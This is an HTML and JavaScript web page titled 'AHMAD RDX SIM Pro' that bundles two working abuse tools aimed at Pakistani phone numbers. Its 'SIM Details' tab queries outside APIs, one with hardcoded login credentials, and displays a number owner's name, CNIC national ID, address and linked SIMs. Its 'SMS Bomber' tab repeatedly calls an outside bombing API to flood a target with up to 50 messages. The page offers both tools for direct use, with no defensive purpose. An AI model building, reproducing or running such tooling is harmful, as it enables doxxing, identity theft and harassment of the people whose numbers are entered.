<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
  <title>AHMAD RDX • SIM Pro</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Outfit', sans-serif;
      background: #0a0a12;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 1.2rem;
    }

    .container {
      width: 100%;
      max-width: 500px;
      background: rgba(18, 18, 28, 0.9);
      backdrop-filter: blur(25px);
      -webkit-backdrop-filter: blur(25px);
      border-radius: 2.2rem;
      padding: 2rem 1.6rem;
      border: 1px solid rgba(255, 255, 255, 0.08);
      box-shadow: 0 30px 50px rgba(0, 0, 0, 0.6);
    }

    .brand {
      text-align: center;
      margin-bottom: 1.8rem;
    }
    .brand .logo {
      font-size: 2rem;
      font-weight: 700;
      letter-spacing: 0.5px;
      background: linear-gradient(135deg, #a78bfa, #818cf8);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
    }
    .brand .tagline {
      font-size: 0.8rem;
      color: #9ca3af;
      font-weight: 500;
      letter-spacing: 0.3px;
    }

    /* Tabs */
    .tabs {
      display: flex;
      gap: 0.8rem;
      margin-bottom: 1.8rem;
      background: rgba(255, 255, 255, 0.04);
      padding: 0.35rem;
      border-radius: 1.2rem;
    }
    .tab {
      flex: 1;
      text-align: center;
      padding: 0.85rem 0.5rem;
      border-radius: 1rem;
      font-weight: 600;
      font-size: 0.9rem;
      cursor: pointer;
      transition: all 0.3s;
      background: transparent;
      color: #94a3b8;
      border: none;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 0.4rem;
    }
    .tab.active {
      background: #4f46e5;
      color: white;
      box-shadow: 0 8px 20px rgba(79, 70, 229, 0.3);
    }

    .panel {
      display: none;
      animation: fade 0.3s ease;
    }
    .panel.active {
      display: block;
    }
    @keyframes fade {
      from { opacity: 0; transform: translateY(8px); }
      to { opacity: 1; transform: translateY(0); }
    }

    .input-area {
      display: flex;
      gap: 0.6rem;
      margin-bottom: 1.2rem;
    }
    .input-field {
      flex: 1;
      padding: 0.9rem 1.2rem;
      border-radius: 1.2rem;
      border: 1.5px solid rgba(255, 255, 255, 0.08);
      background: rgba(255, 255, 255, 0.05);
      color: white;
      font-size: 0.95rem;
      outline: none;
      transition: 0.3s;
    }
    .input-field:focus {
      border-color: #a78bfa;
      box-shadow: 0 0 0 4px rgba(167, 139, 250, 0.15);
    }
    .input-field::placeholder {
      color: #6b7280;
    }

    .btn {
      padding: 0.9rem 1.6rem;
      border: none;
      border-radius: 1.2rem;
      font-weight: 600;
      font-size: 0.9rem;
      cursor: pointer;
      display: inline-flex;
      align-items: center;
      gap: 0.4rem;
      transition: 0.3s;
      white-space: nowrap;
      letter-spacing: 0.3px;
    }
    .btn-primary {
      background: #4f46e5;
      color: white;
      box-shadow: 0 10px 20px -5px rgba(79, 70, 229, 0.3);
    }
    .btn-danger {
      background: #e11d48;
      color: white;
      box-shadow: 0 10px 20px -5px rgba(225, 29, 72, 0.3);
    }
    .btn:disabled {
      opacity: 0.6;
      pointer-events: none;
    }

    /* SIM details card (MH TECH style) */
    .sim-record-card {
      background: rgba(0, 0, 0, 0.4);
      backdrop-filter: blur(12px);
      border-radius: 1.5rem;
      padding: 1.2rem 1.5rem;
      border: 1px solid rgba(255, 255, 255, 0.06);
      margin-top: 1.2rem;
    }
    .live-header {
      display: flex;
      align-items: center;
      gap: 0.5rem;
      margin-bottom: 1.2rem;
      padding-bottom: 0.8rem;
      border-bottom: 1px solid rgba(255, 255, 255, 0.08);
    }
    .live-dot {
      width: 10px;
      height: 10px;
      background: #10b981;
      border-radius: 50%;
      box-shadow: 0 0 10px #10b981;
      animation: pulse 1.5s infinite;
    }
    @keyframes pulse {
      0% { opacity: 1; transform: scale(1); }
      50% { opacity: 0.6; transform: scale(1.2); }
      100% { opacity: 1; transform: scale(1); }
    }
    .live-text {
      font-weight: 600;
      color: #10b981;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }
    .section {
      margin-bottom: 1rem;
    }
    .section-title {
      font-size: 0.7rem;
      font-weight: 600;
      color: #9ca3af;
      text-transform: uppercase;
      letter-spacing: 0.8px;
      margin-bottom: 0.3rem;
    }
    .section-content {
      font-size: 1rem;
      font-weight: 500;
      color: #f1f5f9;
      line-height: 1.5;
      display: flex;
      flex-direction: column;
      gap: 0.2rem;
    }
    .cnic-display {
      font-family: 'Outfit', monospace;
      letter-spacing: 0.5px;
      background: rgba(255,255,255,0.05);
      padding: 0.3rem 0.8rem;
      border-radius: 0.8rem;
      display: inline-block;
      margin-top: 0.2rem;
    }
    .sim-list {
      display: flex;
      flex-wrap: wrap;
      gap: 0.5rem;
      margin-top: 0.3rem;
    }
    .sim-chip {
      background: rgba(79, 70, 229, 0.15);
      border: 1px solid rgba(79, 70, 229, 0.3);
      border-radius: 2rem;
      padding: 0.3rem 1rem;
      font-size: 0.9rem;
      font-weight: 500;
      color: #c7d2fe;
    }

    .empty-state {
      text-align: center;
      color: #6b7280;
      padding: 2rem;
    }

    /* Bomber extras */
    .bomber-options {
      display: flex;
      align-items: center;
      gap: 0.8rem;
      margin: 1rem 0;
    }
    .count-input {
      width: 70px;
      padding: 0.6rem;
      border-radius: 0.9rem;
      background: rgba(255,255,255,0.06);
      border: 1px solid rgba(255,255,255,0.1);
      color: white;
      text-align: center;
      font-weight: 600;
      outline: none;
    }
    .progress-wrap {
      margin-top: 1rem;
      display: none;
    }
    .progress-bar {
      height: 8px;
      background: rgba(255,255,255,0.08);
      border-radius: 20px;
      overflow: hidden;
    }
    .progress-fill {
      height: 100%;
      width: 0%;
      background: #e11d48;
      border-radius: 20px;
      transition: width 0.3s;
    }
    .progress-text {
      text-align: right;
      font-size: 0.8rem;
      color: #cbd5e1;
      margin-top: 0.3rem;
    }
    #bomberLog {
      max-height: 200px;
      overflow-y: auto;
      margin-top: 0.8rem;
    }
  </style>
</head>
<body>
<div class="container">
  <div class="brand">
    <div class="logo">AHMAD RDX</div>
    <div class="tagline">2‑in‑1 SIM Pro</div>
  </div>

  <div class="tabs">
    <button class="tab active" id="tabSim" onclick="switchTab('sim')">
      <i class="fas fa-id-card"></i> SIM Details
    </button>
    <button class="tab" id="tabBomber" onclick="switchTab('bomber')">
      <i class="fas fa-bomb"></i> SMS Bomber
    </button>
  </div>

  <!-- SIM Details Panel -->
  <div class="panel active" id="panelSim">
    <div class="input-area">
      <input type="text" class="input-field" id="simInput" placeholder="03XX-XXXXXXX" autocomplete="off">
      <button class="btn btn-primary" id="simFetchBtn" onclick="fetchSimDetails()">
        <i class="fas fa-search"></i> Retrieve
      </button>
    </div>
    <div id="simResult"></div>
  </div>

  <!-- SMS Bomber Panel -->
  <div class="panel" id="panelBomber">
    <div class="input-area">
      <input type="text" class="input-field" id="bomberInput" placeholder="03XX-XXXXXXX" autocomplete="off">
      <button class="btn btn-danger" id="bomberStartBtn" onclick="startBombing()">
        <i class="fas fa-bomb"></i> Start
      </button>
    </div>
    <div class="bomber-options">
      <span style="color:#cbd5e1;">Count:</span>
      <input type="number" class="count-input" id="bombCount" value="5" min="1" max="50">
      <span style="color:#9ca3af; font-size:0.8rem;">(max 50)</span>
    </div>
    <div class="progress-wrap" id="bomberProgress">
      <div class="progress-bar">
        <div class="progress-fill" id="progressFill"></div>
      </div>
      <div class="progress-text" id="progressText">0/5</div>
    </div>
    <div id="bomberLog"></div>
  </div>
</div>

<script>
  function switchTab(tab) {
    document.getElementById('tabSim').classList.toggle('active', tab === 'sim');
    document.getElementById('tabBomber').classList.toggle('active', tab === 'bomber');
    document.getElementById('panelSim').classList.toggle('active', tab === 'sim');
    document.getElementById('panelBomber').classList.toggle('active', tab === 'bomber');
  }

  // --- SIM Details with MH TECH Style ---
  async function fetchSimDetails() {
    const phone = document.getElementById('simInput').value.trim();
    if (!phone) {
      document.getElementById('simResult').innerHTML = '<div class="empty-state">Enter a number to retrieve data</div>';
      return;
    }
    const btn = document.getElementById('simFetchBtn');
    btn.disabled = true;
    btn.innerHTML = '<span class="spinner" style="width:16px;height:16px;border:2px solid rgba(255,255,255,0.2);border-top-color:white;border-radius:50%;animation:spin 0.7s linear infinite;"></span> Loading';

    const simResult = document.getElementById('simResult');
    simResult.innerHTML = '<div class="empty-state"><span class="spinner" style="width:18px;height:18px;border:2px solid rgba(255,255,255,0.1);border-top-color:#a78bfa;border-radius:50%;animation:spin 0.8s linear infinite;"></span> Fetching records...</div>';

    const api1 = `https://blacksimdetail.vercel.app/public_apis/simdetailsapi.php?number=${phone}`;
    const api3 = `https://app.findpakjobs.pk/api.php?username=wduser1&password=112233&number=${phone}`;

    let simData = null;

    // Try first API
    try {
      const res = await fetch(api1);
      if (res.ok) {
        const text = await res.text();
        try {
          const json = JSON.parse(text);
          if (json && typeof json === 'object') simData = normalizeSimData(json);
        } catch(e) {}
      }
    } catch (e) {}

    // Try second API if no data yet
    if (!simData) {
      try {
        const res = await fetch(api3);
        if (res.ok) {
          const text = await res.text();
          try {
            const json = JSON.parse(text);
            if (json && typeof json === 'object') simData = normalizeSimData(json);
          } catch(e) {}
        }
      } catch (e) {}
    }

    if (simData && (simData.name || simData.cnic || simData.address || simData.sims?.length > 0)) {
      // Build the MH TECH style card
      let simsHtml = '';
      if (simData.sims && simData.sims.length > 0) {
        simsHtml = simData.sims.map(s => `<span class="sim-chip">${escapeHtml(s)}</span>`).join('');
      } else if (simData.number) {
        simsHtml = `<span class="sim-chip">${escapeHtml(simData.number)}</span>`;
      }

      const html = `
        <div class="sim-record-card">
          <div class="live-header">
            <div class="live-dot"></div>
            <span class="live-text">RECORDS (LIVE)</span>
          </div>
          <div class="section">
            <div class="section-title">IDENTITY</div>
            <div class="section-content">
              <span>${simData.name || '—'}</span>
              <span class="cnic-display">CNIC: ${simData.cnic || '—'}</span>
            </div>
          </div>
          <div class="section">
            <div class="section-title">ADDRESS</div>
            <div class="section-content">${simData.address || '—'}</div>
          </div>
          <div class="section">
            <div class="section-title">SIM CARDS (${simData.sims?.length || 1})</div>
            <div class="sim-list">${simsHtml || '—'}</div>
          </div>
        </div>
      `;
      simResult.innerHTML = html;
    } else {
      simResult.innerHTML = `<div class="empty-state" style="color:#f87171;">⚠️ No records found for this number. It may be invalid or service unavailable.</div>`;
    }

    btn.disabled = false;
    btn.innerHTML = '<i class="fas fa-search"></i> Retrieve';
  }

  function normalizeSimData(json) {
    // Flatten if nested
    let flat = json;
    if (json.data && typeof json.data === 'object' && !Array.isArray(json.data)) {
      flat = {...json, ...json.data};
    } else if (json.result && typeof json.result === 'object') {
      flat = {...json, ...json.result};
    }

    // Extract known fields
    const name = flat.name || flat.fullname || flat.owner_name || '';
    const cnic = flat.cnic || flat.nic || flat.cnic_no || '';
    const address = flat.address || flat.permanent_address || flat.city || '';
    const number = flat.number || flat.msisdn || flat.phone || '';

    // SIMs array: if there's a 'sims' array use it, else create from number
    let sims = [];
    if (Array.isArray(flat.sims)) {
      sims = flat.sims.map(String);
    } else if (number) {
      sims = [number];
    }

    return { name, cnic, address, number: sims[0] || number, sims };
  }

  function escapeHtml(text) {
    if (!text) return '';
    return String(text).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
  }

  // --- SMS Bomber ---
  async function startBombing() {
    const phone = document.getElementById('bomberInput').value.trim();
    const count = parseInt(document.getElementById('bombCount').value) || 5;
    if (!phone) return alert('Enter phone number');
    if (count < 1 || count > 50) return alert('Count must be 1-50');

    const btn = document.getElementById('bomberStartBtn');
    const progressWrap = document.getElementById('bomberProgress');
    const progressFill = document.getElementById('progressFill');
    const progressText = document.getElementById('progressText');
    const logDiv = document.getElementById('bomberLog');
    const simBtn = document.getElementById('simFetchBtn');

    btn.disabled = true;
    simBtn.disabled = true;
    btn.innerHTML = '<span class="spinner" style="width:16px;height:16px;border:2px solid rgba(255,255,255,0.2);border-top-color:white;border-radius:50%;animation:spin 0.7s linear infinite;"></span> Bombing';
    progressWrap.style.display = 'block';
    logDiv.innerHTML = '';

    const api2 = `https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php?number=${phone}`;

    for (let i = 1; i <= count; i++) {
      try {
        const res = await fetch(api2);
        const text = await res.text();
        logDiv.innerHTML += `<div style="font-size:0.8rem; color:#10b981;">✓ ${i}/${count} – ${text.substring(0, 16)}</div>`;
      } catch (e) {
        logDiv.innerHTML += `<div style="font-size:0.8rem; color:#f87171;">✗ ${i}/${count} failed</div>`;
      }
      progressFill.style.width = (i / count * 100) + '%';
      progressText.textContent = `${i}/${count}`;
      if (i < count) await new Promise(r => setTimeout(r, 800));
    }

    logDiv.innerHTML += `<div style="font-weight:600; color:#a78bfa; margin-top:0.5rem;">✅ Completed (${count} attempts)</div>`;
    btn.disabled = false;
    simBtn.disabled = false;
    btn.innerHTML = '<i class="fas fa-bomb"></i> Start';
    setTimeout(() => { progressWrap.style.display = 'none'; }, 2500);
  }

  // CSS spinner animation
  const style = document.createElement('style');
  style.textContent = `@keyframes spin { to { transform: rotate(360deg); } }`;
  document.head.appendChild(style);
</script>
</body>
  </html>
